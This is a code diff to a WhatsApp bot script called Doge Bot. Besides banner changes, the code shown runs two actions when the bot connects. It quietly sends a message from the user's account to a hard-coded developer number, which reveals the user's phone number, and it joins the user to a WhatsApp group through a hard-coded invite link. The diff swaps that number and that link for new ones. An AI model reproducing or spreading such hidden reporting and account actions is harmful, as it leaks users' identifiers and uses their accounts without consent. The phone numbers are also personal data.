@@ -34,11 +34,11 @@ const starts = async (DogeXeonOP = new WAConnection()) => {
 	}), 'cyan'))
 	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
 console.log(color('> GITHUB: DGXeon ','silver'))
-console.log(color('> WA NUMBER: +916909137213 ','silver'))
+console.log(color('> WA NUMBER: +212691420825','silver'))
 console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
     console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
     console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
-    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/916909137213'))
+    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/212691420825'))
     console.log(color('[DOGE BOT]'), color('Doge Bot Is Online', 'aqua'))
     console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
     console.log(color('<>','red'), color('Thanks For Using Doge Bot', 'white'))
@@ -55,10 +55,10 @@ console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
         success('2', 'Connected ✓')
     })
         //inform to developer that the user is connected to bot
-    DogeXeonOP.sendMessage(`916909137213@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    DogeXeonOP.sendMessage(`212691420825@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
     
     //group link target
-    teks = `https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS`
+    teks = `https://chat.whatsapp.com/ElfhXRjTkReEsXF00QRyx5`
     DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
     
     await DogeXeonOP.connect({timeoutMs: 30*1000})
